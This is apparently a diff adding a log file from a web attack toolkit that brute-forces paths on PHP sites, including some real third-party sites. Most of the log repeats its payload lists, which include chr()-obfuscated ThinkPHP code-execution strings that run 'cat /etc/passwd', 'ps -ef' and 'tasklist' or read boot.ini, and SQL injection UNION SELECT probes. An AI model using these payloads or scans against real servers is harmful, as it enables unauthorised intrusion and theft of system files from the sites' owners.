+/index.php/admin/
+/index.php/admin/authentication/sa
+/index.php/admin/authentication/sa/login
+/index.php/admin/authentication/sa/logins
+/index.php/admin/authentication/sa/login~
+/index.php/admin/authentication/sa/notexist_path
+/index.php/admin/authentication/sa/notexist_paths
+/index.php/admin/authentication/sa/notexist_path~
+/index.php/admin/s
+/index.php/admin/~
+/index.php/ajax/api/reputation
+/index.php/ajax/api/reputation/vote/
+/index.php/ajax/api/reputation/vote/s
+/index.php/ajax/api/reputation/vote/~
+/index.php/api
+/index.php/api/xmlrpc
+/index.php/api/xmlrpcs
+/index.php/api/xmlrpc~
+/index.php/cms
+/index.php/cms/item-comment
+/index.php/cms/item-comments
+/index.php/cms/item-comment~
+/index.php/list-10%20UNION/**/all/**/SELECT/**
+/index.php/module/action/param1
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(md5(0.204910492051))}
+/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+/index.php/module/action/param1/${@print(md5(0.684747658043))}
+/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/product
+/index.php/product/list
+/index.php/product/lists
+/index.php/product/list~
+/index.php/tools-staticPage.html
+/index.php/tools-staticPage.htmls
+/index.php/tools-staticPage.html~
+/index.php/weblinks-categories
+/index.php/weblinks-categoriess
+/index.php/weblinks-categories~
+  
+2015-12-07 17:33:54    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/*123*/'union/**/select/**
+/index.php/*123*/'union/**/select/**/1"
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+/index.php/Index/index/name
+/index.php/Index/index/name/${@print(md5(1122))}s
+/index.php/Index/index/name/${@print(md5(1122))}~
+/index.php/admin/
+/index.php/admin/authentication/sa
+/index.php/admin/authentication/sa/login
+/index.php/admin/authentication/sa/logins
+/index.php/admin/authentication/sa/login~
+/index.php/admin/authentication/sa/notexist_path
+/index.php/admin/authentication/sa/notexist_paths
+/index.php/admin/authentication/sa/notexist_path~
+/index.php/admin/s
+/index.php/admin/~
+/index.php/ajax/api/reputation
+/index.php/ajax/api/reputation/vote/
+/index.php/ajax/api/reputation/vote/s
+/index.php/ajax/api/reputation/vote/~
+/index.php/api
+/index.php/api/xmlrpc
+/index.php/api/xmlrpcs
+/index.php/api/xmlrpc~
+/index.php/cms
+/index.php/cms/item-comment
+/index.php/cms/item-comments
+/index.php/cms/item-comment~
+/index.php/list-10%20UNION/**/all/**/SELECT/**
+/index.php/module/action/param1
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(md5(0.204910492051))}
+/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+/index.php/module/action/param1/${@print(md5(0.684747658043))}
+/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/product
+/index.php/product/list
+/index.php/product/lists
+/index.php/product/list~
+/index.php/tools-staticPage.html
+/index.php/tools-staticPage.htmls
+/index.php/tools-staticPage.html~
+/index.php/weblinks-categories
+/index.php/weblinks-categoriess
+/index.php/weblinks-categories~
+  
+2015-12-07 17:40:00    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=texe.txt","url":"localhost","dict":"texe.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:41:30    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=MDB.txt","url":"localhost","dict":"MDB.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:42:04    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=MDB.txt","url":"localhost","dict":"MDB.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:43:25    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=texe.txt","url":"localhost","dict":"texe.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:43:52    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=MDB.txt","url":"localhost","dict":"MDB.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:44:27    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=MDB.txt","url":"localhost","dict":"MDB.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:44:33    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:44:37    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=texe.txt","url":"localhost","dict":"texe.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:45:03    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=MDB.txt","url":"localhost","dict":"MDB.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:45:29    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:45:35    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=texe.txt","url":"localhost","dict":"texe.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:46:41    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:46:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:46:46    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:46:55    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:46:59    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=texe.txt","url":"localhost","dict":"texe.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:48:44    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:49:12    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/*123*/'union/**/select/**
+/index.php/*123*/'union/**/select/**/1"
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+/index.php/Index/index/name
+/index.php/Index/index/name/${@print(md5(1122))}s
+/index.php/Index/index/name/${@print(md5(1122))}~
+/index.php/admin/
+/index.php/admin/authentication/sa
+/index.php/admin/authentication/sa/login
+/index.php/admin/authentication/sa/logins
+/index.php/admin/authentication/sa/login~
+/index.php/admin/authentication/sa/notexist_path
+/index.php/admin/authentication/sa/notexist_paths
+/index.php/admin/authentication/sa/notexist_path~
+/index.php/admin/s
+/index.php/admin/~
+/index.php/ajax/api/reputation
+/index.php/ajax/api/reputation/vote/
+/index.php/ajax/api/reputation/vote/s
+/index.php/ajax/api/reputation/vote/~
+/index.php/api
+/index.php/api/xmlrpc
+/index.php/api/xmlrpcs
+/index.php/api/xmlrpc~
+/index.php/cms
+/index.php/cms/item-comment
+/index.php/cms/item-comments
+/index.php/cms/item-comment~
+/index.php/list-10%20UNION/**/all/**/SELECT/**
+/index.php/module/action/param1
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(md5(0.204910492051))}
+/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+/index.php/module/action/param1/${@print(md5(0.684747658043))}
+/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/product
+/index.php/product/list
+/index.php/product/lists
+/index.php/product/list~
+/index.php/tools-staticPage.html
+/index.php/tools-staticPage.htmls
+/index.php/tools-staticPage.html~
+/index.php/weblinks-categories
+/index.php/weblinks-categoriess
+/index.php/weblinks-categories~
+  
+2015-12-07 17:49:16    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=texe.txt","url":"localhost","dict":"texe.txt"},"token":"7654123"}    NO Result  
+2015-12-07 17:49:32    {"cmd":"enurl","msg":{"msg":"http:\/\/localhost\/ThinkPHP\/Home\/Code\/url"},"token":"7654123"}    http%3A//localhost/ThinkPHP/Home/Code/url  
+2015-12-07 17:50:17    {"cmd":"md5md5","msg":{"msg":"1"},"token":"7654123"}    c4ca4238a0b923820dcc509a6f75849ba0b923820dcc509a  
+2016-01-19 11:43:27    {"cmd":"deurl","msg":{"msg":"%68%74%74%70%3A%2F%2F%77%77%77%33%2E%6B%66%75%2E%65%64%75%2E%63%6E%2F%79%78%7A%64%2F%77%79%78%79%2F%63%73%73%2F%31%32%33%2E%61%73%70"},"token":"7654123"}    http://www3.kfu.edu.cn/yxzd/wyxy/css/123.asp  
+2016-03-08 13:29:30    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2016-03-08 13:29:41    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:43    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:43    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:44    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:45    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:45    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:45    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:45    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:46    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:47    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:47    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:48    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:48    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:49    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:49    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:50    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:50    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:50    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:50    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:50    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:51    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:52    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:53    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-08 13:29:54    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=http%3A%2F%2Fwww.cn-heli.cn%2Fnews.asp&dict=all.txt","url":"http:\/\/www.cn-heli.cn\/news.asp","dict":"all.txt"},"token":"7654123"}    NO Result  
+2016-03-24 15:42:11    {"cmd":"debase64","msg":{"msg":"LJWzFNnHsVjBlY9+nzTNkOby13DRJgrZRvJnC0sWSvbBAU7lFJMXsVWcR3QzxVGOt5ahWbAo9vIPlxmUMsh10yWRr25Ue39hZ01KQ+tZG0IL83qb6vAtKj5myThV84EQ5uXjQxrbrSTfCatrQCr3AcBy0ZKxQqodQyqTN6NhfeI="},"token":"7654123"}    ,•³ÙÇ±XÁ•~Ÿ4Íæò×pÑ&
+ÙFògKJöÁNå“±UœGt3ÅQŽ·–¡Y°(öò—”2ÈuÓ%‘¯nT{agMJCëYBóz›êð-*>fÉ8UóæåãCÛ­$ß	«k@*÷ÀrÑ’±BªC*“7£a}â  
+2016-03-24 15:42:52    {"cmd":"debase64","msg":{"msg":"nzTNkOby13DRJgrZRvJnC0sWSvbBAU7lFJMXsVWcR3QzxVGOt5ahWbAo9vIPlxmUMsh10yWRr25Ue39hZ01KQ+tZG0IL83qb6vAtKj5myThV84EQ5uXjQxrbrSTfCatrQCr3AcBy0ZKxQqodQyqTN6NhfeI="},"token":"7654123"}    Ÿ4Íæò×pÑ&
+ÙFògKJöÁNå“±UœGt3ÅQŽ·–¡Y°(öò—”2ÈuÓ%‘¯nT{agMJCëYBóz›êð-*>fÉ8UóæåãCÛ­$ß	«k@*÷ÀrÑ’±BªC*“7£a}â  
+2016-03-24 15:42:54    {"cmd":"debase64","msg":{"msg":"nzTNkOby13DRJgrZRvJnC0sWSvbBAU7lFJMXsVWcR3QzxVGOt5ahWbAo9vIPlxmUMsh10yWRr25Ue39hZ01KQ+tZG0IL83qb6vAtKj5myThV84EQ5uXjQxrbrSTfCatrQCr3AcBy0ZKxQqodQyqTN6NhfeI="},"token":"7654123"}    Ÿ4Íæò×pÑ&
+ÙFògKJöÁNå“±UœGt3ÅQŽ·–¡Y°(öò—”2ÈuÓ%‘¯nT{agMJCëYBóz›êð-*>fÉ8UóæåãCÛ­$ß	«k@*÷ÀrÑ’±BªC*“7£a}â  
+2016-03-24 15:42:54    {"cmd":"debase64","msg":{"msg":"nzTNkOby13DRJgrZRvJnC0sWSvbBAU7lFJMXsVWcR3QzxVGOt5ahWbAo9vIPlxmUMsh10yWRr25Ue39hZ01KQ+tZG0IL83qb6vAtKj5myThV84EQ5uXjQxrbrSTfCatrQCr3AcBy0ZKxQqodQyqTN6NhfeI="},"token":"7654123"}    Ÿ4Íæò×pÑ&
+ÙFògKJöÁNå“±UœGt3ÅQŽ·–¡Y°(öò—”2ÈuÓ%‘¯nT{agMJCëYBóz›êð-*>fÉ8UóæåãCÛ­$ß	«k@*÷ÀrÑ’±BªC*“7£a}â  
+2016-03-24 15:42:55    {"cmd":"debase64","msg":{"msg":"nzTNkOby13DRJgrZRvJnC0sWSvbBAU7lFJMXsVWcR3QzxVGOt5ahWbAo9vIPlxmUMsh10yWRr25Ue39hZ01KQ+tZG0IL83qb6vAtKj5myThV84EQ5uXjQxrbrSTfCatrQCr3AcBy0ZKxQqodQyqTN6NhfeI="},"token":"7654123"}    Ÿ4Íæò×pÑ&
+ÙFògKJöÁNå“±UœGt3ÅQŽ·–¡Y°(öò—”2ÈuÓ%‘¯nT{agMJCëYBóz›êð-*>fÉ8UóæåãCÛ­$ß	«k@*÷ÀrÑ’±BªC*“7£a}â  
+2016-03-24 15:53:31    {"cmd":"debase64","msg":{"msg":"LJWzFNnHsVjBlY9+nzTNkOby13DRJgrZRvJnC0sWSvbBAU7lFJMXsVWcR3QzxVGOt5ahWbAo9vIPlxmUMsh10yWRr25Ue39hZ01KQ+tZG0IL83qb6vAtKj5myThV84EQ5uXjQxrbrSTfCatrQCr3AcBy0ZKxQqodQyqTN6NhfeI="},"token":"7654123"}    ,•³ÙÇ±XÁ•~Ÿ4Íæò×pÑ&
+ÙFògKJöÁNå“±UœGt3ÅQŽ·–¡Y°(öò—”2ÈuÓ%‘¯nT{agMJCëYBóz›êð-*>fÉ8UóæåãCÛ­$ß	«k@*÷ÀrÑ’±BªC*“7£a}â  
